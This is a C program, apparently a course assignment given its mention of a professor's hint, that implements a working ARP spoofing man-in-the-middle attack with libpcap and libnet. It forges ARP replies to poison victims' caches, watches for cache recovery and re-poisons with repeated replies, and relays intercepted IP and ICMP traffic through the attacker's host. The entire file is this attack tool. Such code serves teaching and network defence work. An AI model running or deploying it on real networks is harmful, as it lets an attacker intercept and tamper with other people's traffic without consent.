#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>

typedef struct {
    char sender_ip[16];
    uint8_t sender_mac[6];
    char target_ip[16];
    uint8_t target_mac[6];
    int infected;          // Flag to track infection status
} arp_pair;

void usage() {
    printf("syntax: main <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: main wlan0 192.168.10.2 192.168.10.1\n");
}

int get_mac_ip(const char* dev, uint8_t* mac, char* ip) {
    libnet_t* ln = libnet_init(LIBNET_LINK, dev, NULL);
    if (ln == NULL) {
        fprintf(stderr, "libnet_init failed\n");
        libnet_destroy(ln);
        return -1;
    }

    struct libnet_ether_addr* my_mac = libnet_get_hwaddr(ln);
    if (my_mac == NULL) {
        fprintf(stderr, "libnet_get_hwaddr failed\n");
        libnet_destroy(ln);
        return -1;
    }

    memcpy(mac, my_mac->ether_addr_octet, 6);

    uint32_t ip_addr = libnet_get_ipaddr4(ln);
    if (ip_addr == -1) {
        fprintf(stderr, "libnet_get_ipaddr4 failed\n");
        libnet_destroy(ln);
        return -1;
    }

    struct in_addr addr;
    addr.s_addr = ip_addr;
    if (inet_ntop(AF_INET, &addr, ip, 16) == NULL) {
        fprintf(stderr, "inet_ntop failed\n");
        libnet_destroy(ln);
        return -1;
    }

    libnet_destroy(ln);
    return 0;
}

int send_request(pcap_t* pcap, uint8_t* src_mac, char* src_ip, char* dst_ip) {
    uint8_t packet[42];
    memset(packet, 0, sizeof(packet));

    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
    memset(eth_hdr->ether_dhost, 0xff, ETHER_ADDR_LEN);
    memcpy(eth_hdr->ether_shost, src_mac, ETHER_ADDR_LEN);
    eth_hdr->ether_type = htons(ETHERTYPE_ARP);

    struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);
    arp_hdr->ar_hln = 6;
    arp_hdr->ar_pln = 4;
    arp_hdr->ar_op = htons(ARPOP_REQUEST);

    uint8_t* arp_data = packet + LIBNET_ETH_H + LIBNET_ARP_H;
    memcpy(arp_data, src_mac, 6);
    arp_data += 6;

    struct in_addr addr;
    inet_pton(AF_INET, src_ip, &addr);
    memcpy(arp_data, &addr, 4);
    arp_data += 4;

    memset(arp_data, 0, 6);
    arp_data += 6;

    inet_pton(AF_INET, dst_ip, &addr);
    memcpy(arp_data, &addr, 4);

    pcap_sendpacket(pcap, packet, sizeof(packet));

    return 0;
}

int get_reply(pcap_t* pcap, char* src_ip, uint8_t* src_mac) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    struct in_addr src_addr;
    inet_pton(AF_INET, src_ip, &src_addr);

    for (int i = 0; i < 15; i++) {
        int res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) {
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) {
            continue;
        }

        struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
        if (ntohs(arp_hdr->ar_op) != ARPOP_REPLY) {
            continue;
        }

        u_int8_t* src_mac_ptr = (u_int8_t*)(packet + LIBNET_ETH_H + LIBNET_ARP_H);
        u_int8_t* src_ip_ptr = (u_int8_t*)(packet + LIBNET_ETH_H + LIBNET_ARP_H + arp_hdr->ar_hln);

        if (memcmp(src_ip_ptr, &src_addr.s_addr, 4) != 0) {
            continue;
        }

        memcpy(src_mac, src_mac_ptr, 6);
        return 0;
    }

    fprintf(stderr, "%s: Timeout ARP reply\n", src_ip);
    return -1;
}

int send_reply(pcap_t* pcap, const uint8_t* my_mac, const uint8_t* sender_mac, const char* sender_ip, const uint8_t* target_mac, const char* target_ip) {
    uint8_t packet_sender[42];
    memset(packet_sender, 0, sizeof(packet_sender));

    struct libnet_ethernet_hdr* eth_hdr_sender = (struct libnet_ethernet_hdr*)packet_sender;
    memcpy(eth_hdr_sender->ether_dhost, sender_mac, ETHER_ADDR_LEN);
    memcpy(eth_hdr_sender->ether_shost, my_mac, ETHER_ADDR_LEN);
    eth_hdr_sender->ether_type = htons(ETHERTYPE_ARP);


    struct libnet_arp_hdr* arp_hdr_sender = (struct libnet_arp_hdr*)(packet_sender + LIBNET_ETH_H);
    arp_hdr_sender->ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr_sender->ar_pro = htons(ETHERTYPE_IP);
    arp_hdr_sender->ar_hln = 6;
    arp_hdr_sender->ar_pln = 4;
    arp_hdr_sender->ar_op = htons(ARPOP_REPLY);


    struct in_addr addr;
    uint8_t* arp_data_sender = packet_sender + LIBNET_ETH_H + LIBNET_ARP_H;
    memcpy(arp_data_sender, my_mac, 6);
    arp_data_sender += 6;

    inet_pton(AF_INET, target_ip, &addr);
    memcpy(arp_data_sender, &addr, 4);
    arp_data_sender += 4;

    memcpy(arp_data_sender, sender_mac, 6);
    arp_data_sender += 6;

    inet_pton(AF_INET, sender_ip, &addr);
    memcpy(arp_data_sender, &addr, 4);

    if (pcap_sendpacket(pcap, packet_sender, sizeof(packet_sender)) != 0) {
        fprintf(stderr, "pcap_sendpacket to sender failed: %s\n", pcap_geterr(pcap));
        return -1;
    }
    return 0;
}

// Check if an IP address matches any sender in our pairs
int find_sender_index(arp_pair* pairs, int count, const char* ip) {
    for (int i = 0; i < count; i++) {
        if (strcmp(pairs[i].sender_ip, ip) == 0) {
            return i;
        }
    }
    return -1;
}

// Check if an IP address matches any target in our pairs
int find_target_index(arp_pair* pairs, int count, const char* ip) {
    for (int i = 0; i < count; i++) {
        if (strcmp(pairs[i].target_ip, ip) == 0) {
            return i;
        }
    }
    return -1;
}

// Function to relay IP packets from sender to target or target to sender
int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
                   const uint8_t* my_mac, const uint8_t* dst_mac) {
    u_char* new_packet = (u_char*)malloc(header->len);
    if (new_packet == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return -1;
    }
    
    // Copy original packet
    memcpy(new_packet, packet, header->len);
    
    // Modify Ethernet header for forwarding
    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)new_packet;
    memcpy(eth_hdr->ether_dhost, dst_mac, ETHER_ADDR_LEN);
    memcpy(eth_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
    
    // Send the modified packet
    if (pcap_sendpacket(pcap, new_packet, header->len) != 0) {
        fprintf(stderr, "Failed to relay IP packet: %s\n", pcap_geterr(pcap));
        free(new_packet);
        return -1;
    }
    
    free(new_packet);
    return 0;
}

// Check if MAC address is our own
int is_my_mac(const uint8_t* mac1, const uint8_t* mac2) {
    return memcmp(mac1, mac2, 6) == 0;
}

// Improved recovery detection based on professor's hint
int detect_recovery(const u_char* packet, arp_pair* pairs, int cnt) {
    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
    if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) {
        return -1; // Not an ARP packet
    }
    
    struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
    
    // Extract ARP packet details
    uint8_t* arp_data = (uint8_t*)(packet + LIBNET_ETH_H + LIBNET_ARP_H);
    uint8_t* sender_hw = arp_data;                        // Sender MAC
    uint8_t* sender_ip = arp_data + 6;                    // Sender IP
    uint8_t* target_hw = arp_data + 10;                   // Target MAC
    uint8_t* target_ip = arp_data + 16;                   // Target IP
    
    // Convert IPs to strings for comparison
    char sender_ip_str[16], target_ip_str[16];
    struct in_addr addr;
    
    addr.s_addr = *(uint32_t*)sender_ip;
    inet_ntop(AF_INET, &addr, sender_ip_str, sizeof(sender_ip_str));
    
    addr.s_addr = *(uint32_t*)target_ip;
    inet_ntop(AF_INET, &addr, target_ip_str, sizeof(target_ip_str));
    
    for (int i = 0; i < cnt; i++) {
        // SCENARIO 1: Sender's ARP cache has expired and it's requesting target's MAC
        // Detect: Sender -> ALL (ARP_REQ) for target IP
        if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST && 
            strcmp(sender_ip_str, pairs[i].sender_ip) == 0 && 
            strcmp(target_ip_str, pairs[i].target_ip) == 0 &&
            memcmp(eth_hdr->ether_dhost, "\xff\xff\xff\xff\xff\xff", 6) == 0) { // Broadcast
            
            printf("Recovery detected (SCENARIO 1): Sender %s is broadcasting ARP request for target %s\n", 
                  sender_ip_str, target_ip_str);
            return i;
        }

        if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST && 
            strcmp(sender_ip_str, pairs[i].target_ip) == 0 && 
            strcmp(target_ip_str, pairs[i].sender_ip) == 0 &&
            memcmp(eth_hdr->ether_dhost, "\xff\xff\xff\xff\xff\xff", 6) == 0) { // Broadcast
            
            printf("Recovery detected (SCENARIO 2): Target %s is broadcasting ARP request for sender %s\n", 
                  target_ip_str, sender_ip_str);
            return i;
        }
    }
    
    return -1; // No recovery detected
}


int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 == 1) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    uint8_t my_mac[6];
    char my_ip[16];
    if (get_mac_ip(dev, my_mac, my_ip) != 0) {
        fprintf(stderr, "Failed to get my MAC, IP address\n");
        return -1;
    }

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    int cnt = (argc - 2) / 2;

    arp_pair* pairs = (arp_pair*)malloc(cnt * sizeof(arp_pair));
    if (pairs == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        pcap_close(pcap);
        return -1;
    }

    // Initialize pairs with MAC addresses
    for (int i = 0; i < cnt; i++) {
        int arg_index = 2 + i * 2;
        char* sender_ip = argv[arg_index];
        char* target_ip = argv[arg_index + 1];

        uint8_t sender_mac[6];
        if (send_request(pcap, my_mac, my_ip, sender_ip) != 0) {
            fprintf(stderr, "%s: Failed to send ARP request\n", sender_ip);
            continue;
        }

        if (get_reply(pcap, sender_ip, sender_mac) != 0) {
            fprintf(stderr, "%s: Failed to get MAC address\n", sender_ip);
            continue;
        }

        uint8_t target_mac[6];
        if (send_request(pcap, my_mac, my_ip, target_ip) != 0) {
            fprintf(stderr, "%s: Failed to send ARP request\n", target_ip);
            continue;
        }

        if (get_reply(pcap, target_ip, target_mac) != 0) {
            fprintf(stderr, "%s: Failed to get MAC address\n", target_ip);
            continue;
        }

        strcpy(pairs[i].sender_ip, sender_ip);
        memcpy(pairs[i].sender_mac, sender_mac, 6);
        strcpy(pairs[i].target_ip, target_ip);
        memcpy(pairs[i].target_mac, target_mac, 6);
        pairs[i].infected = 0; // Initialize infection status
    }

    // Initial ARP spoofing for all pairs
    for (int i = 0; i < cnt; i++) {
        if (send_reply(pcap, my_mac, pairs[i].sender_mac, pairs[i].sender_ip, 
                      pairs[i].target_mac, pairs[i].target_ip) == 0) {
            pairs[i].infected = 1;
            printf("Successfully infected pair %d (%s -> %s)\n", 
                  i, pairs[i].sender_ip, pairs[i].target_ip);
        }
    }

    printf("Starting MITM Attack with ARP Spoofing\n");

    // Main packet capture and relay loop
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    while (1) {
        
        int res = pcap_next_ex(pcap, &header, &packet);
        
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex error: %s\n", pcap_geterr(pcap));
            break;
        }
        
        // Extract Ethernet header
        struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
        
        // Skip packets sent by us to avoid loops
        if (is_my_mac(eth_hdr->ether_shost, my_mac)) {
            continue;
        }
        
        // Check for ARP recovery
        int recovered_pair = detect_recovery(packet, pairs, cnt);
        if (recovered_pair >= 0) {
            // Re-infect this specific pair immediately
            printf("Re-infecting pair %d after recovery detection\n", recovered_pair);
            for (int i = 0; i < 10; i++) {
                send_reply(pcap, my_mac, pairs[recovered_pair].sender_mac, 
                    pairs[recovered_pair].sender_ip, 
                    pairs[recovered_pair].target_mac, 
                    pairs[recovered_pair].target_ip);
            }
            
            pairs[recovered_pair].infected = 1;
        }
        
        // Check if this packet is destined for us (after our ARP poisoning)
        int is_for_me = is_my_mac(eth_hdr->ether_dhost, my_mac);
        
        // Handle IP packets for relaying (including ICMP)
        if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP && is_for_me) {
            // Extract IP header
            struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);
            
            // Convert IP addresses to strings
            char src_ip[16], dst_ip[16];
            struct in_addr src_addr, dst_addr;
            
            src_addr.s_addr = ip_hdr->ip_src.s_addr;
            dst_addr.s_addr = ip_hdr->ip_dst.s_addr;
            
            inet_ntop(AF_INET, &src_addr, src_ip, sizeof(src_ip));
            inet_ntop(AF_INET, &dst_addr, dst_ip, sizeof(dst_ip));
            
            // Check for packets from sender to target
            int sender_idx = find_sender_index(pairs, cnt, src_ip);
            int target_idx = find_target_index(pairs, cnt, dst_ip);
            if (sender_idx == target_idx && sender_idx >= 0) {
                // This packet came from a sender, relay to its target
                printf("Relaying IP packet from sender %s to target %s", src_ip, dst_ip);
                
                // Check for ICMP specifically
                if (ip_hdr->ip_p == IPPROTO_ICMP) {
                    printf(" (ICMP packet)");
                }
                printf("\n");
                
                relay_ip_packet(pcap, packet, header, my_mac, pairs[sender_idx].target_mac);
            }
        }
    }

    free(pairs);
    pcap_close(pcap);
    return 0;
}
